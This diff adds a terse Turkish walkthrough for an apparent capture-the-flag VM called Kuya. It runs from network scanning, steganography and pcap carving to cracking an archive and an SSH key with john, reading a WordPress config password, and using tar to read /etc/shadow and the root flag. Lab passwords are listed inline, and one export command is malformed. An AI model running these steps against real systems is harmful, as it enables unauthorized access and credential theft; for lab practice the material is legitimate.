@@ -1,0 +1,24 @@
+KUYA MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.72 bulundu.
+2 - nmap -A 192.168.2.72
+3 - http://192.168.2.72/loot, Download, steghide extract -sf file_name
+4 - cat emb.txt -> echo "hash" | base64 -d -> "What is Balut ?"
+5 - wireshark loot.pcapng, tcp stream eq 0, loot.7z found
+6 - File -> Extract Objects -> HTTP
+7 - 7z2john loot.7z > hash
+8 - john hash -w=/usr/share/wordlists/rockyou.txt, manchester
+9 - 7z e loot.7z
+10 - cat id_rsa.pub, Users: test
+11 - ssh2john id_rsa > hash
+12 - john hash -w=/usr/share/wordlists/rockyou.txt, hello
+13 - ssh -i id_rsa test@192.168.2.72
+14 - sh .ssh/sshscript.sh -> 5256247262
+15 - cat /var/www/html/wordpress/wp-config-sample.php, kuya : Chrepia##@@!!
+16 - su kuya
+17 - cat /home/kuya/who_dis.txt, IL0v3C@f3HaV@nA
+18 - env, PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+19 - export PATH:/bin:/sbin:/usr/bin:/usr/sbin:$PATH
+20 - tar -cvf shadow.tar "/root"
+21 - tar -xvf shadow.tar
+22 - cat etc/shadow
+23 -  cat root/M3m3L0rd.txt
